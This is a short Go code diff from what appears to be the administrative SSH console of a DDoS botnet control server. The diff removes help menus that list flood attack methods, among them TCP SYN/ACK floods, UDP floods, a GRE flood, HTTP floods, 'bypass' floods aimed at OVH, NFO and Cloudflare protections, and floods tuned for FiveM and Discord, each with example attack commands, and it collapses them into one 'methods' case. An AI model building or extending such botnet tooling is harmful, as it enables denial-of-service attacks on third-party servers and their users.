@@ -560,57 +560,7 @@ func AdminSSH(conn net.Conn) {
 			}
 			continue
 
-		case "tcp_methods", "methods_tcp":
-			rows := [][]string{
-				{".synflood", ansiCommands + "TCP SYN flood" + ansiReset},
-				{".ackflood", ansiCommands + "TCP ACK flood" + ansiReset},
-				{".sackflood", ansiCommands + "TCP SACK flood" + ansiReset},
-				{".tcpstream", ansiCommands + "TCP stream flood" + ansiReset},
-				{".tcpsocket", ansiCommands + "TCP socket flood (high connections)" + ansiReset},
-				{".tcpwra", ansiCommands + "TCP wra flood (game servers)" + ansiReset},
-				{".tcpbypass", ansiCommands + "TCP bypass flood" + ansiReset},
-				{".ovh", ansiCommands + "TCP OVH bypass flood" + ansiReset},
-				{".nfo", ansiCommands + "TCP NFO bypass flood" + ansiReset},
-				{".stomp", ansiCommands + "TCP stomp flood (Handshake)" + ansiReset},
-				{"", ""},
-				{"Example", ansiCommands + ".synflood 1.1.1.1 60 dport=80" + ansiReset},
-			}
-			writeGradientTable(session.Conn, []string{"TCP Methods", "Description"}, rows)
-
-		case "udp_methods", "methods_udp":
-			rows := [][]string{
-				{".udpplain", ansiCommands + "UDP flood with random payload" + ansiReset},
-				{".udpthread", ansiCommands + "UDP flood with threads" + ansiReset},
-				{".ppsflood", ansiCommands + "UDP flood high PPS" + ansiReset},
-				{".stdhex", ansiCommands + "UDP flood with random hex payload" + ansiReset},
-				{"", ""},
-				{"Example", ansiCommands + ".udpthread 1.1.1.1 60 dport=80" + ansiReset},
-			}
-			writeGradientTable(session.Conn, []string{"UDP Methods", "Description"}, rows)
-
-		case "game_methods", "methods_game":
-			rows := [][]string{
-				{".fivem", ansiCommands + "UDP flood optimized for FiveM servers" + ansiReset},
-				{".discord", ansiCommands + "UDP flood optimized for Discord" + ansiReset},
-			}
-			writeGradientTable(session.Conn, []string{"Game Methods", "Description"}, rows)
-
-		case "l3_methods", "methods_l3", "layer3_methods", "methods_layer3":
-			rows := [][]string{
-				{".greip", ansiCommands + "GRE IP flood (Layer 3)" + ansiReset},
-				{"", ""},
-				{"Example", ansiCommands + ".greip 1.1.1.1 60" + ansiReset},
-			}
-			writeGradientTable(session.Conn, []string{"Layer 3 Methods", "Description"}, rows)
-
-		case "l7_methods", "methods_l7", "layer7_methods", "methods_layer7":
-			rows := [][]string{
-				{".http", ansiCommands + "HTTP flood (Layer 7)" + ansiReset},
-				{".browser", ansiCommands + "Browser emulation optimized for CF Captcha & UAM" + ansiReset},
-				{"", ""},
-				{"Example", ansiCommands + ".browser https://target.com/ 60 250(rate)" + ansiReset},
-			}
-			writeGradientTable(session.Conn, []string{"Layer 7 Methods", "Description"}, rows)
+		case "methods":
 
 			// Flags command
 			//==============================================================================================================================================================================================================================================================================================================================//
